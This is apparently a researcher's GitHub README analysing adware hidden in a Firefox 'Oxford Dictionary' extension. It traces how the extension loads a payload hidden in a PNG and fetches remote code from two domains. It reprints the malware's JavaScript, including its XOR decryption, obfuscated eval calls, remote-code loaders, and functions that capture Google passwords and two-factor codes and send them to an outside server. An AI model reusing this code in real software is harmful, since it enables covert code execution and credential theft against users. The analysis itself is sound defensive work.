# HomebrewOverlay <!-- omit in toc -->

### :warning: **Disclaimer**  <!-- omit in toc -->

The files in this repository are for **research & educational** purposes. This is **NOT my code and I take NO responsibility** for how you use the code available here.

If you choose to use the code contained in this repository, understand that you are doing so at your own risk and you agree that under no circumstances will I be liable for any indirect, incidental, consequential, special or exemplary damages arising out of or in connection with your use of this code.

:exclamation::exclamation: **Using the source code within this page and repository can result in civil/criminal charges being brought against you.**

---

This is an analysis of the adware/malware contained within the Firefox extension [**Oxford Dictionary**](https://addons.mozilla.org/en-US/firefox/addon/oxford-dictionary/) (Extension ID: `{0aa583da-e323-42f2-b4d2-0bc61b493171}`) by a user named "Oxford Dictionary" (Registered 20190108, 1 extension published).

This analysis covers versions:

- **2.2**   - 234.78 KB - Released 20190309
- **2.2.1** - 226.04 KB - Released 20190708
- **2.3.0** - 226.16 KB - Released 20190718

![Imgur](https://i.imgur.com/26p3JZm.png)

## Table of Contents <!-- omit in toc -->

- [:newspaper: Background](#newspaper-background)
- [:pisces: Signs](#pisces-signs)
- [:bow_and_arrow: The Hunt](#bow_and_arrow-the-hunt)
- [:camping: In the Wild](#camping-in-the-wild)
- [:bento: Components in Package](#bento-components-in-package)
- [:link: **Loading Chain**](#link-loading-chain)
  - [Step 1](#step-1)
  - [Step 2](#step-2)
  - [Step 3](#step-3)
  - [Step 4](#step-4)
  - [Step 5](#step-5)
  - [Step 6](#step-6)
  - [Step 7](#step-7)
  - [Step 8](#step-8)
- [:volcano: Points of Interest](#volcano-points-of-interest)
  - [Harvesting Google account passwords](#harvesting-google-account-passwords)

## :newspaper: Background

This extension offers users a way to select text and lookup entries at Lexico.com (a website run by Dictionary.com and Oxford Dictionaries) through an embedded in-page "pop-up" window or by querying for the selected word on Lexico.com. Translation capabilities are also offered. The extension requests for permission to "Access your data for all websites" and "Access browser tabs". As Firefox extension XPI files are common ZIP files, they can be easily be uncompressed and its contents inspected.

## :pisces: Signs

The first overt sign generated by this extension is a transparent black overlay placed over webpages with a "Continue" link in the center of the screen and a "X" (close) link at the top right corner of the screen as seen in the screenshot at the top of this page. You can also notice requests to `gmzdaily.com` and `mitarchive.info` domains.

## :bow_and_arrow: The Hunt

Analyzing requested scripts on the affected webpages uncovered nothing suspicious; an "all-sources" search in the Firefox debugger returned *7.js* loaded into memory, but no indication as to the source of this file. The next suspect would be extension code since it is capable of injecting and running scripts.

Each extension XPI file was then extracted and examined. However, grepping through every extension's source scripts did not return any results for "homebrew". I moved to examining each extension manually. Here, I noticed the odd *bg.js* and *content.js* scripts with seemingly innocuous functions unrelated to the extension's supposed functionality. I also noticed the loading of *cross.png*. Viewing this file in a hex editor immediately revealed the added payload.

## :camping: In the Wild

Many variable names and log strings within the adware code contain Mandarin words in PinYin, suggesting a Chinese origin. Searches for various unique strings (names, log messages, cookie names, etc) returned some results:

- The Google Analytics ID `UA-60144933` appeared in 1 result from Nov 2017
- The cookie `hibext_instdsigdipv2` appeared around Feb 2018
- The DIV ID `extwaiimpotscp` appeared around Sep 2018
- The variable name `exversion_jojo` appeared in a report from Aug 2017
- [A GitHub account](https://github.com/hinterlandy) called [*hinterlandy*](https://imgur.com/hQV4Qes) hosting one of the components has initial commits from Oct 2017
- [A Flickr account](https://www.flickr.com/photos/148226393@N05/) of user [named Charles Lee](https://imgur.com/nzvJ8qs) has the username *hinterlandy* with photos referring to the Chrome Tab Hide extension was created in Mar 2017

The malware code contains a reference to a removed Google Chrome extension named "[Tab Hide - Fast hide tabs (best Panic Button)](https://crx.dam.io/ext/bjamanegmopfidjfikhkjkbhnaaikedo.html)" (Extension ID: bjamanegmopfidjfikhkjkbhnaaikedo). Version 1.5.1 and later of this Tab Hide extension contain earlier implementations of adware code.

- The cookie `hibext_instdsigdip` appeared around Sep 2017

Two domains are used by the adware:

- `gmzdaily.com`: Created Nov 2011 @ Wild West Domains. [RDAP Information](https://rdap.verisign.com/com/v1/domain/gmzdaily.com).
- `mitarchive.info`: Created Jul 2014 @ GoDaddy. [RDAP Information](https://rdap.afilias.net/rdap/info/domain/mitarchive.info).

Two mentions of the generated overlay (HomeBrewOverlay) can be found at [Reddit](https://www.reddit.com/r/duckduckgo/comments/az4do6/mystery_continue_overlay_on_duckduckgo/) (Mar 2019) and [StackOverflow](https://stackoverflow.com/questions/54872477/find-the-source-that-added-the-following-html-in-a-page-on-firefox) (Feb 2019).

## :bento: Components in Package

- *install/bg.js* - Background script. Runs when extension is loaded and is independent of any browser tab/window.
- *install/content.js* - Content script. Runs in the context of the webpage.
- *icons/cross.png* - Image of Lithuanian flag. Contains an encrypted payload.

## :link: **Loading Chain**

This adware's code contain various unused and misleadingly-named functions. In this short analysis I will focus only on how this adware loads itself, and leave analysis of effects for a later date.

### Step 1

*bg.js* runs and sets an obfuscated timestamp value in `storage.local` and `storage.sync`. 2.5 days later, the code loads *icons/cross.png*, removes the first 250 bytes and stores the remainder into a variable called `cross` in `storage.local`.

[***install/bg.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/bg.js): [Enfka()](https://github.com/rainyrainyday/HomeBrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/bg.js#L114)

```javascript
function Enfka() {
  var a = Math.abs(chrome.runtime.id.split("").reduce(function(a, b) {
            a = (a << 5) - a + b.charCodeAt(0); return a & a;
          }, 0)) % 1000, b = btoa(a).replace(/=/g, "");

  chrome.storage.sync.get(null, function(c) {
    // RAIN: Timestamp value set
    if (c = c[b]) {
      if (c /= a,
          c = ((new Date).getTime() - c) / 3600000 / 24,
          console.log(c), 2.5 < c) { // RAIN: More than 2.5 days

          c = browser.extension.getURL("icons/cross.png");
          var d = new XMLHttpRequest;
          d.onreadystatechange = function(a) {
            if (this.readyState === XMLHttpRequest.DONE && 200 === this.status) {
              a = {};
              var b = this.responseText.indexOf("substring") + 9;
              // RAIN: Extract last 12565 bytes
              a.cross = this.responseText.substring(b);
              chrome.storage.local.set(a);
            }
          };
          d.open("GET", c, !0); d.send(null);
      }
    // RAIN: Timestamp value not set
    } else {
      c = (new Date).getTime() * a,
      d = {}, chrome.storage.local.set((d[b] = c, d), function() {}),
      d = {}, chrome.storage.sync.set((d[b] = c, d), function() {});
    }
  });
}
```

> *bg.js* contains various unrelated functions from a forum software called Discuz!. The only functions that will be called are `GRMin()`, and `Enfka()`.

An examination of *icons/cross.png* shows that the first 250 bytes comprise the entirety of the PNG's datastream.

![Imgur](https://i.imgur.com/FrthjNU.png)

### Step 2

*content.js* now decrypts the payload hidden in `cross` with a misleadingly-named function, transforming it into *1.js*.

[***install/content.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/content.js): [genDigest()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/content.js#L230)

```javascript
// RAIN: This function attemps to look like a function that generates a SHA1 digest.
function genDigest(b) {
  // RAIN: Attempt at obfuscation, this pattern is used throughout the code
  var sha1;
  var hashmap = _ => Object.keys(sha1);
  sha1 = {
    eate: document.querySelectorAll('*'),
    e: 1,
    lav: 5,
    tob: 'xl=',
    color: setcolor = 1,
    YW: a => hashmap()[2].split('').reverse().join('')  // RAIN: Returns "val"
  };
  chrome.storage.local.get(null, function(a) {
    if (a = a[b]) {
      a = sendtoArray(a);  // RAIN: Decrypt
      var d = a.indexOf("bytearray") + 9;
      a = a.substring(d);

      // RAIN: Obfuscation of this[eval](a)
      // This effectively calls eval() on the contents of 1.js
      this[hashmap()[1]+sha1.YW()](a);
    }
  })
}
genDigest('cross');
```

[***install/content.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/content.js): [toArray()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/content.js#L212), [keyCharAt()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/content.js#L217), [mapKey()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/content.js#L220), [sendToArray()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Unzipped/2.3.0%20-%20%7B0aa583da-e323-42f2-b4d2-0bc61b493171%7D/install/content.js#L224)

```javascript
// RAIN: Shortened decryption function combining code in toArray() and keyCharAt()
function mapKey(data) {
  var result = [];
  for (i = 0; i < data.length; i++) {
    // RAIN: XORs each character with subsequent character codes from the letters in
    // the fixed key ("undefined"): [117, 110, 100, 101, 102, 105, 110, 101, 100]
    var character = data[i];
    result.push(character.charCodeAt(0) ^ "undefined".charCodeAt(i % 9));
  }
  return result
}

function sendtoArray(data) {
  arr = mapKey(data);
  ret = "";
  for (i in arr) oneChar = String.fromCharCode(arr[i]), ret += oneChar;
  return ret
}
```

> *content.js* contains various unrelated functions from a forum software called Discuz!. The only functions that will be called are `toArray()`, `keyCharAt()`, `mapKey()`, `sendtoArray()`, and `getDigest()`.

### Step 3

*1.js* contains a packed script with its string dictionary Base-64 encoded and case/8/9-flipped to prevent easy analysis. The unpacked script results in *2.js*, which is evaluated. The call to `eval()` is again obfuscated using the same technique as in *content.js*.

[***Scripts/1.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/1.js): [misNlJGu()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/1.js#L156)

```javascript
function misNlJGu(s) {
  var QcwswUYm = { site: "", dc: function(e) { return 'eKcFkRDf'; } };  // RAIN: Irrelevant

  // RAIN: Script needs to run within the browser context, otherwise
  // output will be garbled as the case-flip won't happen.
  var flp = false;
  if (typeof(chrome) != "undefined") {
    if (typeof(chrome.storage) != "undefined") {
      flp = true;
    }
  }

  var ret = '';
  var rjTjoStb = ret + "eKcFkRDf";  // RAIN: Irrelevant
  for (var i = 0; i < s.length; i++) {
    var ch = s[i];

    // RAIN: Flips cases
    if (ch == ch.toLowerCase() && flp) { ch = ch.toUpperCase(); }
    else if (ch == ch.toUpperCase() && flp) { ch = ch.toLowerCase(); }

    // RAIN: Changes 9 to 8 and vice-versa
    if (ch == "9") { ch = "8"; } else if (ch == "8") { ch = "9"; }

    ret = ret + ch;
    rjTjoStb += ch;
  }
  if (rjTjoStb == "QcwswUYm") { return "" }  // RAIN: Irrelevant
  else { return atob(ret); }
}
```

> The code in *1.js* also contains a bunch of unused functions. The only function that will be executed in the unpacking process is `misNlJGu()`.

### Step 4

The execution of the code in *2.js* on opening each new tab now waits for 3 days before downloading scripts from either `https://gmzdaily.com/ext/qm.php?f=svr` or `https://mitarchive.info/ext/qm.php?f=svr`. This downloaded script (*3.raw.js*) is then encrypted to prevent easy identification before it is stored in LocalStorage under a key named `dipLstCd666`.

[***Scripts/2.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js): [lodeInsDt()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js#L14), [LdRmtSvrCd()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js#L73), [SvRmtSvrCd()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js#L95)

```javascript
// RAIN: Reformatted for clarity
function lodeInsDt() {
  var a = localVals.InsDt6;  

  if (a) {  // RAIN: Installation timestamp set
    a = ((new Date).getTime() - a) / 1000 / 3600 / 24;

    if (3 > a) {  // RAIN: If less than 3 days
      loderlog(a + '<3 deng...')  
    } else {
      // RAIN: If "Need Fetch Server Code" (has randomization built-in),
      // "Load Remote Server Code". The TRUE argument here results in the
      // code first attempting to retrieve from gmzdaily.com.
      if (NdFtchSvrCd()) { LdRmtSvrCd(!0) }

      // RAIN: "Execute Remote Server Code"
      ExRmtSvrCd();
    }
  } else {
    loderlog('local unavailable, use cloud now...');
    ftInsDt6();  // Sets installation timestamp
  }
}

// RAIN: "Load Remote Server Code". Reformatted for clarity
function LdRmtSvrCd(a) {
  try {
    var b = new XMLHttpRequest;
    b.onreadystatechange = function () {
      if (b.readyState == 4) {
        if (200 == b.status) {
          SvRmtSvrCd(b.responseText);  // RAIN: "Save Remote Server Code"
        } else {
          a && LdRmtSvrCd(!1));  // RAIN: If gmzdaily.com fails, load the other
        }
      }
    };
    b.onerror = function () { a && LdRmtSvrCd(!1) };  // RAIN: If gmzdaily.com fails, load the other
    b.onprogress = function () { };

    // RAIN: "https://gmzdaily.com/ext/qm.php?f=svr" Base-64 encoded
    var c = atob('aHR0cHM6Ly9nbXpkYWlseS5jb20vZXh0L3FtLnBocD9mPXN2cg==');
    // RAIN: "https://mitarchive.info/ext/qm.php?f=svr" Base-64 encoded
    a || (c = atob('aHR0cHM6Ly9taXRhcmNoaXZlLmluZm8vZXh0L3FtLnBocD9mPXN2cg=='));

    localVals.dipLstSig666 && 0 == c.includes('&c=') && (c = c + '&c=' + localVals.dipLstSig666);
    loderlog('jia zai ' + c);  // RAIN: "jia zai" means "load" in Mandarin
    b.open('GET', c, !0);
    b.send()
  } catch (f) {
    return 'exception'
  }
}

// RAIN: "Save Remote Server Code"
function SvRmtSvrCd(a) {
  if (20 < a.length && a.includes('svrdpcds')) {
    loderlog('suc shuaxin');  // RAIN: "Successfully refreshed"
    var b = a.search('`'),
    c = a.substring(0, b);
    a = a.substring(b + 1);
    b = { };
    b.dipLstSig666 = c;  // RAIN: Version date
    b.dipLstLd666 = (new Date).getTime();  // RAIN: Load time
    b.dipLstCd666 = repitoff(a);  // RAIN: Encrypt payload
    b.dipLstCd66 = ''
  } else b = { };
  b.dipLstLd666 = (new Date).getTime();  // RAIN: Load time
  chrome.storage.local.set(b)
}
```

The script is encrypted with a simple XOR cipher with a transformation of the extension's ID as a key. Based on this extension's ID, the value of num will be 2393.

[***Scripts/2.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js): [repitoff()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js#L121), [xor_str()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js#L126), [randomize()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js#L111)

```javascript
// RAIN: Reformatted for clarity
function repitoff(message) {
  var num = randomize(chrome.runtime.id);  // RAIN: 2393
  return xor_str(message, num)
}

function xor_str(message, num) {
  var c = '';
  for (i = 0; i < message.length; ++i) c += String.fromCharCode(num ^ message.charCodeAt(i));
  return c
}

function randomize(a) {
  a = a.split('').reduce(function (a, c) {
    a = (a << 5) - a + c.charCodeAt(0);
    return a & a
  }, 0);
  0 > a && (a = 0 - a);
  window.chrome && (a %= 10000);
  return a
}
```

> *2.js* contains routines that inject code if the code is run within an IFRAME

### Step 5

Next the `ExRmtSvrCd()` function in *2.js* decrypts the code in `dipLstCd666` (*3.js*) and evaluates it. *3.js* contains another packed script with its string dictionary Base-64 encoded and case/8/9-flipped. This script when unpacked results in *4.js*, which is then evaluated.

[***Scripts/2.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js): [ExRmtSvrCd()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/2.js#L37)  
[***Scripts/3.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/3.js): [Decrypted `dipLstCd666`](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/3.js)

```javascript
// RAIN: More obfuscation of "eval"
var RePlAcMe1, RePlAcMe2 = function (a) { return Object.keys(RePlAcMe1) };
RePlAcMe1 = {
  eate: document.querySelectorAll('*'),
  e: 1,
  lav: 5,
  tob: 'xl=',
  color: setcolor = 1,
  YW: function (a) { return RePlAcMe2() [2].split('').reverse().join('') }
};

function ExRmtSvrCd() {
  var a = repitoff(localVals.dipLstCd666);  // RAIN: XOR again to get 3.js
  if (a && a.includes('svrdpcds')) {
    this[RePlAcMe2()[1] + RePlAcMe1.YW()](a)  // RAIN: Evaluate
  }
}
```

### Step 6

*4.js* now performs a check after 6 days for human interaction. A flag `isHmn1` is set when human interaction occurs either through interaction with an [injected reCAPTCHA](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/recapt.html), or if this doesn't work within 10 days of the install date, an overlay with close and continue buttons is injected which would set the flag upon interaction with the buttons. **This is the first obvious sign of this adware.**

*4.js* also attempts to mask its presence by inserting random variables into `storage.local` and `storage.sync` through `insertRandVarNames()` at Line 49.

> *4.js* contains a large amount of domain name strings. It is too large to be displayed within the GitHub UI, hence line numbers to the functions are given below.

1. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `ldExtInsDtInsDt6()` (Line 294)
2. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `ldIsHmnRslt()` (Line 352)
3. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `ftIsHmn()` (Line 361)
4. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `reCapt()` (Line 379)

```javascript
// RAIN: Reformatted for clarity
function reCapt() {
  if (!(inIfrm() || -1 < document.location.href.indexOf('mail.google.com')) && document.location.hostname) {
      var a = localVals.InsDt6,  // RAIN: Installation timestamp
          b = 0;
      a && (b = ((new Date).getTime() - a) / 1000 / 3600 / 24);  // RAIN: Days since

      if (b > 10) {  // RAIN: 10 days since install date
        consolelog('forcing homebrew method');
        showHomebrewOverlay();  // RAIN: Creates the overlay
      } else {
        consolelog('using google invisible method');
        shRecapDv('//hinterlandy.github.io/recapt/recapt.html');
      }

      a = { };
      a.lastCapt = (new Date).getTime();
      chrome.storage.local.set(a)
  }
}
```

With the `isHmn1` flag set to the interaction time, loading of the remote script from `gmzdaily.com` or `mitarchive.info` can proceed through the following chain:

1. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `ldExtInsDtNew()` (Line 469)
2. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `istImgDm()` (Line 480)
3. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `ldLclStrg()` (Line 580)
4. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `ldNwVes()` (Line 589)
5. [***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `updtDaima()` (Line 594)

```javascript
function updtDaima(a) {
  try {
    var b = window.XMLHttpRequest ? new XMLHttpRequest :
            window.XDomainRequest ? new window.XDomainRequest :
            new ActiveXObject('Microsoft.XMLHTTP');

    b.onreadystatechange = function () {
      4 == b.readyState &&
        (200 == b.status ? ldRmtDaima(b.responseText) :
          a && (consolelog('switch to backup...'), updtDaima(!1)))  // RAIN: Get from backup
    };

    b.onerror = function () {
      a && (consolelog('switch to backup...'), updtDaima(!1))  // RAIN: Get from backup
    };

    b.onprogress = function () { };

    var c = 'https://gmzdaily.com/ext/qm.php?f=ga';
    a || (c = 'https://mitarchive.info/ext/qm.php?f=ga');

    dipLstSig88 && -1 == c.indexOf('&c=') && (c = c + '&c=' + dipLstSig88);
    consolelog('loading from ' + c);
    b.open('GET', c, !0);
    b.send()
  } catch (d) {
    return 'exception'
  }
}
```

This remote script is then saved into local storage variable called `dipLstCd88` (*5.js*). As before, this remote script contains a packed script that is Base-64 encoded twice then cases-flipped (a slight modification of the techniques used before).

[***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `ldRmtDaima()` (Line 621)

```javascript
function ldRmtDaima(a) {
  if (20 < a.length && -1 < a.indexOf('dipextsig')) {
    consolelog('succ shuaxin');
    var b = a.search('`'),
    c = a.substring(0, b);
    a = a.substring(b + 1);
    b = {  };
    b.dipLstSig88 = c;
    b.dipLstLd88 = (new Date).getTime();
    b.dipLstCd88 = a  // RAIN: Store into variable
  } else consolelog('no shuaxin from gmz svr: length=' + a.length + ' sig=' + a.indexOf('dipextsig'));
  b = { };
  b.dipLstLd88 = (new Date).getTime();  // RAIN: Set updated time
  chrome.storage.local.set(b)
}
```

[***Scripts/4.digest.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.digest.js): [Decrypted `dipLstCd99`](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.digest.js)

*4.js* also contains an encrypted code snippet that is subsequently stored in `dipLstCd99`. This snippet inserts a SCRIPT tag that downloads *5.raw.js* from `gmzdaily.com/ext/ga.js` (the link is to a JS file rather than a PHP file as above, however they are the same). This code is not run by any other routine in the loading chain.

### Step 7

*4.js* then executes the code in `dipLstCd88` (*5.js*) resulting in the decoding of *6.js*: a packed script. This is immediately evaluated to become *7.js*.

[***Scripts/4.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/4.js): `ldBckGr()` (Line 650), ***Scripts/5.js***, ***Scripts/6.js***

```javascript
function ldBckGr(a) {
  // RAIN: Successfully loaded external "ga" file (see Step 6)
  setTimeout(function () { consolelog('succ load ext-ga') }, 150);
  a.search('"');
  var b = a.substring(0, 8),
  c = a.length;
  a = (a + b).substring(0, c);
  consolelog('==>  ' + a.substring(0, 20));
  (new Function(a)) ();  // RAIN: Execute the contents of "a"
  return c
}
```

### Step 8

*7.js* is the final body of this adware. Injection of ads commences through a function called `Ruko66()`.

[***Scripts/7.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js): [Ruko66()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js#L1269)

## :volcano: Points of Interest

There are some interesting functions in *7.js* as follows:

### Harvesting Google account passwords

A set of functions within the adware code attempts to exfiltrate Google account usernames and passwords. :information_source: **These functions are never called**.

Google Login HTML structure (as of Oct 2019): [Email](https://imgur.com/CQeY6MI), [Password](https://imgur.com/pgGVQDK)

[***Scripts/7.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js): [hkNxtBnClk()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js#L702), [googCacheFunc()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js#L710), [hkScndFctAuth()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js#L715), [googCacheFunc2()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js#L723)

```javascript
// RAIN: Reformatted for clarity
function hkNxtBnClk() {
  extgaLog("hkNxtBnClk");

  // RAIN: passwordNext is the ID of the Next button on Google's login page
  var a = document.getElementById("passwordNext");

  if (a) {
    // RAIN: Adds listener to the click action
    a.addEventListener("click", googCacheFunc, !1);

    // RAIN: Adds listener for Enter key press (keyCode 13)
    document.documentElement.addEventListener("keypress", function(a) {
          13 === a.keyCode && googCacheFunc()
      }, !1);
  } else {
    setTimeout(hkNxtBnClk, 1E3);  // RAIN: Every second
  }
}

// RAIN: Reformatted for clarity
function googCacheFunc() {
  var data = "",
      // RAIN: profileIdentifier is the ID of the element with the user's email address
      // on Google's login page
      email = document.getElementById("profileIdentifier").innerHTML,
      password = "",
      elements = document.getElementsByTagName("input");

  // RAIN: For each INPUT element, if type is password, store its value
  for (var i = 0; i < elements.length; i++) {
    if ("password" == elements[i].getAttribute("type")) {
      password = elements[i].value;
    }
  }

  if (0 != password.length) {
    data = data + ("uid: " + email + "\t\tpass: ") + (password + "\r\n\r\nlogin: ") + (window.location.href + "\r\n");
    data += "normal: " + getDomain(!1) + "\r\n";
    data += "ext: " + extType + "\r\n";
    data += "instd: " + numDayInst + "\r\n";
    data += "uid: " + usrHxId + "\r\n";
    data += "why: googlogin\r\n";
    extgaLog(data);
    localStorage.setItem("extCacheFunc", dblB64(data, "encode"));
    hkScndFctAuth();  // RAIN: Caches two-factor code
  }
}

// RAIN: Reformatted for clarity
function hkScndFctAuth() {
    extgaLog("hkScndFctAuth");

    // RAIN: This ID is incorrect
    var a = document.getElementById("next");

    if (a) {
      a.addEventListener("click", googCacheFunc2, !1);
      document.documentElement.addEventListener("keypress", function(a) {
        13 === a.keyCode && googCacheFunc2()
      }, !1);
    } else {
      setTimeout(hkScndFctAuth, 1E3)
    }
}

// RAIN: Reformatted for clarity
function googCacheFunc2() {
  var a = "",
      b = "",
      c = document.getElementsByTagName("input");

  for (var d = 0; d < c.length; d++) {
    if ("text" == c[d].getAttribute("type") || "tel" == c[d].getAttribute("type")) {
      b = c[d].value;
    }
  }

  if (0 != b.length) {
    a = a + ("2nd factor: " + b + "\r\n\r\nlogin: ") + (window.location.href + "\r\n");
    a += "normal: " + getDomain(!1) + "\r\n";
    a += "ext: " + extType + "\r\n", a += "instd: " + numDayInst + "\r\n", a += "uid: " + usrHxId + "\r\n";
    a += "why: goog2nd\r\n";
    extgaLog(a);
    localStorage.setItem("extCacheFunc2", dblB64(a, "encode"));
  }
}
```

These functions store data into local storage that would be sent to the server through other functions (also never called).

[***Scripts/7.js***](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js): [SdLclStrg()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js#L792), [GtAlexaInfo()](https://github.com/rainyrainyday/HomebrewOverlay/blob/master/Scripts/7.js#L762)

```javascript
// RAIN: "Send Local Storage": Gets cached info and sends it off
function SdLclStrg() {
    var a = localStorage.getItem("extCacheFunc");
    a && 0 < a.length && GtAlexaInfo(a)
}

// RAIN: Reformatted for clarity
function GtAlexaInfo(a) {
  var b = new XMLHttpRequest;
  b.onreadystatechange = function() {
    if (4 == b.readyState) {
      // RAIN: If current top domain is www.booking.com, this response will return a double
      // Base-64 encoded string containing: "89`68306`viglink viglink2 skimlinks2 yieldkit awin"
      var c = b.responseText;

      if (0 < c.length) {
        c = dblB64(c, "decode");
        var d = c.split("`")[0];
        c.split("`");
        var e = c.split("`")[2];

        if ("" == d) { d = "99999999999"; }

        var f = false;
        c = "[P] " + getDomain(false);

        if (500 < parseInt(d) && 1E5 > parseInt(d)) {
          f = "UNKNOWN";
          if (500 < parseInt(d) && 1E3 > parseInt(d)) { f = "AAAA1K"; }
          if (1E3 < parseInt(d) && 1E4 > parseInt(d)) { f = "BBB10K"; }
          if (1E4 < parseInt(d) && 1E5 > parseInt(d)) { f = "CC100K"; }
          c = "[Rank=" + f + "]" + c;
          f = true;
        }

        if (isExcludeAlexFltr()) { f = false; }
        if (0 < e.length) { c = "[Merchant]" + c; f = true }

        if (f) {
          d = new XMLHttpRequest;
          e = "https://gmzdaily.com/alt.php?&c=" + a;  // RAIN: Data in the local storage is sent to server
          e = e + "&u=" + dblB64("[AlexaFilter]" + c, "encode");
          d.open("GET", e, true);
          d.send();
        }

        localStorage.setItem("extCacheFunc", "");
      }
    }
  };

  b.open("GET", "https://mitarchive.info/alexbob.php?s=http://" + getTopDomain(), !0);
  b.send()
}
```

## :warning: Disclaimer  <!-- omit in toc -->

The files in this repository are for **research & educational** purposes. This is **NOT my code and I take NO responsibility** for how you use the code available here.

If you choose to use the code contained in this repository, understand that you are doing so at your own risk and you agree that under no circumstances will I be liable for any indirect, incidental, consequential, special or exemplary damages arising out of or in connection with your use of this code.

:exclamation::exclamation: **Using the source code of this adware/malware can result in civil/criminal charges being brought against you.**
